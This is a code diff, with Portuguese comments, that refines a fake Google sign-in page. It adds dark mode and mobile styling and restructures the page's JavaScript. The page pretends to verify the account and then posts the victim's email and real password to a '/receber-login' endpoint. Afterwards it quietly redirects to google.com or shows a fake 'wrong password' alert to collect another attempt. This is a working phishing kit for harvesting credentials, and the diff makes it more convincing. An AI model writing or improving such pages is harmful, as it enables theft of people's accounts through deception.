@@ -12,73 +12,103 @@
             font-family: 'Segoe UI', Roboto, Arial, sans-serif;
         }
         
-        body {
-            background: #fff;
-            color: #202124;
-            min-height: 100vh;
+        /* Variáveis CSS para temas */
+        :root {
+            --bg-color: #ffffff;
+            --text-color: #202124;
+            --border-color: #dadce0;
+            --input-bg: #ffffff;
+            --box-bg: #ffffff;
+            --link-color: #1a73e8;
+            --footer-text: #757575;
+            --logo-color: #5f6368;
         }
         
-        /* Header */
+        /* Modo escuro automático */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #202124;
+                --text-color: #e8eaed;
+                --border-color: #5f6368;
+                --input-bg: #202124;
+                --box-bg: #2d2e30;
+                --link-color: #8ab4f8;
+                --footer-text: #9aa0a6;
+                --logo-color: #e8eaed;
+            }
+        }
+        
+        body {
+            background: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            transition: all 0.3s ease;
+        }
+        
+        /* Header - Mais para cima */
         .header {
-            padding: 24px 0;
+            padding: 20px 0 16px 0; /* Reduzido padding */
             text-align: center;
-            border-bottom: 1px solid #dadce0;
+            border-bottom: 1px solid var(--border-color);
         }
         
         .google-logo {
             font-size: 22px;
-            font-weight: 600; /* Mais grosso */
-            color: #5f6368;
+            font-weight: 600;
+            color: var(--logo-color);
         }
         
-        /* Main Container - Alinhado mais para cima */
+        /* Main Container - Mais para cima */
         .container {
             max-width: 448px;
-            margin: 40px auto 0; /* Margem apenas no topo */
-            padding: 0 40px;
+            margin: 24px auto 0; /* Reduzido margin-top */
+            padding: 0 24px;
         }
         
         .login-box {
-            border: 1px solid #dadce0;
+            border: 1px solid var(--border-color);
             border-radius: 8px;
-            padding: 48px 40px 36px;
+            padding: 40px 32px 32px; /* Reduzido padding */
+            background: var(--box-bg);
         }
         
         /* Title */
         .title {
             text-align: center;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
         }
         
         .title h1 {
             font-size: 24px;
-            font-weight: 400;
-            color: #202124;
+            font-weight: 600; /* Mais grosso */
+            color: var(--text-color);
             margin-bottom: 8px;
         }
         
         .title p {
             font-size: 16px;
-            color: #202124;
+            color: var(--text-color);
             font-weight: 400;
         }
         
         /* Form */
         .form-group {
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
         
         .input-field {
             width: 100%;
             padding: 13px 15px;
-            border: 1px solid #dadce0;
+            border: 1px solid var(--border-color);
             border-radius: 4px;
             font-size: 16px;
             transition: all 0.2s;
+            background: var(--input-bg);
+            color: var(--text-color);
         }
         
         .input-field:focus {
-            border-color: #1a73e8;
+            border-color: var(--link-color);
             outline: none;
             box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
         }
@@ -87,7 +117,7 @@
             border-color: #d93025;
         }
 
-        /* Campo de senha (inicialmente escondido) */
+        /* Campo de senha */
         .password-field {
             display: none;
             margin-top: 16px;
@@ -97,11 +127,11 @@
         .forgot-link {
             display: block;
             text-align: left;
-            margin-bottom: 26px;
+            margin-bottom: 24px;
         }
         
         .forgot-link a {
-            color: #1a73e8;
+            color: var(--link-color);
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
@@ -114,13 +144,13 @@
         /* Info Text */
         .info-text {
             font-size: 14px;
-            color: #5f6368;
-            margin: 32px 0 26px;
+            color: var(--footer-text);
+            margin: 28px 0 24px;
             line-height: 1.4286;
         }
         
         .info-text a {
-            color: #1a73e8;
+            color: var(--link-color);
             text-decoration: none;
             font-weight: 500;
         }
@@ -137,7 +167,7 @@
         }
         
         .create-account {
-            color: #1a73e8;
+            color: var(--link-color);
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
@@ -148,7 +178,7 @@
         }
         
         .next-button {
-            background: #1a73e8;
+            background: var(--link-color);
             color: white;
             border: none;
             border-radius: 4px;
@@ -156,30 +186,32 @@
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: all 0.2s;
         }
         
         .next-button:hover {
             background: #1669d6;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
         }
         
         .next-button:disabled {
-            background: #1a73e8;
+            background: var(--link-color);
             opacity: 0.6;
             cursor: not-allowed;
+            box-shadow: none;
         }
         
         /* Footer */
         .footer {
-            padding: 24px 0;
-            border-top: 1px solid #dadce0;
-            margin-top: 40px;
+            padding: 20px 0;
+            border-top: 1px solid var(--border-color);
+            margin-top: 32px;
         }
         
         .footer-content {
             max-width: 448px;
             margin: 0 auto;
-            padding: 0 40px;
+            padding: 0 24px;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -188,20 +220,21 @@
         
         .language-select {
             border: none;
-            background: none;
-            color: #1a73e8;
+            background: var(--bg-color);
+            color: var(--link-color);
             font-size: 12px;
             cursor: pointer;
             padding: 8px;
+            border-radius: 4px;
         }
         
         .footer-links {
             display: flex;
-            gap: 24px;
+            gap: 20px;
         }
         
         .footer-links a {
-            color: #757575;
+            color: var(--footer-text);
             text-decoration: none;
             font-size: 12px;
         }
@@ -210,22 +243,65 @@
             text-decoration: underline;
         }
         
-        /* Responsive */
+        /* Responsive para mobile */
         @media (max-width: 480px) {
             .container {
-                padding: 24px;
-                margin-top: 20px;
+                padding: 16px;
+                margin-top: 16px;
             }
             
             .login-box {
                 border: none;
                 padding: 24px 0;
+                background: transparent;
             }
             
             .footer-content {
                 flex-direction: column;
-                gap: 16px;
+                gap: 12px;
+                text-align: center;
             }
+            
+            .footer-links {
+                justify-content: center;
+                flex-wrap: wrap;
+            }
+            
+            .title h1 {
+                font-size: 22px;
+            }
+        }
+        
+        /* Responsive para telas muito pequenas */
+        @media (max-width: 360px) {
+            .container {
+                margin-top: 12px;
+                padding: 12px;
+            }
+            
+            .login-box {
+                padding: 20px 0;
+            }
+            
+            .buttons {
+                flex-direction: column;
+                gap: 12px;
+                align-items: stretch;
+            }
+            
+            .create-account {
+                text-align: center;
+                order: 2;
+            }
+            
+            .next-button {
+                order: 1;
+            }
+        }
+        
+        /* Animação suave para troca de temas */
+        * {
+            transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease;
         }
     </style>
 </head>
@@ -262,7 +338,7 @@
 
                 <div class="buttons">
                     <a href="#" class="create-account">Criar conta</a>
-                    <button type="submit" class="next-button" id="submitBtn">Próxima</button>
+                    <button type="button" class="next-button" id="submitBtn">Próxima</button>
                 </div>
             </form>
         </div>
@@ -292,72 +368,104 @@
         const passwordInput = document.getElementById('password');
         const forgotLink = document.getElementById('forgotLink');
         const submitBtn = document.getElementById('submitBtn');
+        const loginForm = document.getElementById('loginForm');
 
-        document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault();
+        // Detectar tema do sistema
+        function detectTheme() {
+            const isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+            console.log('Tema detectado:', isDark ? 'Escuro' : 'Claro');
+        }
+
+        // Função para avançar para o próximo passo
+        function nextStep() {
+            const email = emailInput.value;
             
+            // Validar email
+            if (!email.includes('@')) {
+                emailInput.classList.add('error');
+                return;
+            }
+            
+            // Simular verificação do Google
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verificando...';
+            
+            setTimeout(() => {
+                // Mostrar campo de senha (segundo passo)
+                passwordField.style.display = 'block';
+                forgotLink.innerHTML = 'Esqueceu a senha?';
+                submitBtn.textContent = 'Fazer login';
+                currentStep = 2;
+                submitBtn.disabled = false;
+                
+                // Focar no campo de senha
+                passwordInput.focus();
+            }, 600);
+        }
+
+        // Função para enviar o login final
+        async function submitLogin() {
             const email = emailInput.value;
             const password = passwordInput.value;
             
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Entrando...';
+            
+            try {
+                // Enviar email E SENHA para o backend
+                const response = await fetch('/receber-login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        senha: password
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    // Redirecionar diretamente para o Google
+                    window.location.href = 'https://google.com';
+                } else {
+                    throw new Error(data.message || 'Erro no servidor');
+                }
+                
+            } catch (error) {
+                // Em caso de erro, mostrar mensagem e limpar senha
+                alert('Senha incorreta. Tente novamente.');
+                passwordInput.value = '';
+                passwordInput.focus();
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Fazer login';
+            }
+        }
+
+        // Event listener para o botão
+        submitBtn.addEventListener('click', function() {
             if (currentStep === 1) {
-                // Primeiro passo: validar email
-                if (!email.includes('@')) {
-                    emailInput.classList.add('error');
-                    return;
-                }
-                
-                // Simular verificação do Google
-                submitBtn.disabled = true;
-                submitBtn.textContent = 'Verificando...';
-                
-                setTimeout(() => {
-                    // Mostrar campo de senha (segundo passo)
-                    passwordField.style.display = 'block';
-                    forgotLink.innerHTML = 'Esqueceu a senha?';
-                    submitBtn.textContent = 'Fazer login';
-                    currentStep = 2;
-                    submitBtn.disabled = false;
-                    
-                    // Focar no campo de senha
-                    passwordInput.focus();
-                }, 800);
-                
+                nextStep();
             } else {
-                // Segundo passo: enviar login com senha
-                submitBtn.disabled = true;
-                submitBtn.textContent = 'Entrando...';
-                
-                try {
-                    // Enviar email E SENHA para o backend
-                    const response = await fetch('/receber-login', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            email: email,
-                            senha: password // Agora envia a senha real
-                        })
-                    });
-                    
-                    const data = await response.json();
-                    
-                    if (response.ok) {
-                        // Redirecionar diretamente para o Google SEM mensagem
-                        window.location.href = 'https://google.com';
-                    } else {
-                        throw new Error(data.message || 'Erro no servidor');
-                    }
-                    
-                } catch (error) {
-                    // Em caso de erro, mostrar mensagem e limpar senha
-                    alert('Senha incorreta. Tente novamente.');
-                    passwordInput.value = '';
-                    passwordInput.focus();
-                } finally {
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'Fazer login';
-                }
+                submitLogin();
+            }
+        });
+
+        // Também permitir avançar com Enter no campo de email
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && currentStep === 1) {
+                e.preventDefault();
+                nextStep();
+            }
+        });
+
+        // E enviar com Enter no campo de senha
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && currentStep === 2) {
+                e.preventDefault();
+                submitLogin();
             }
         });
 
@@ -389,6 +497,12 @@
                 emailInput.focus();
             }
         });
+
+        // Detectar tema ao carregar a página
+        detectTheme();
+        
+        // Ouvir mudanças de tema
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', detectTheme);
     </script>
 </body>
 </html>
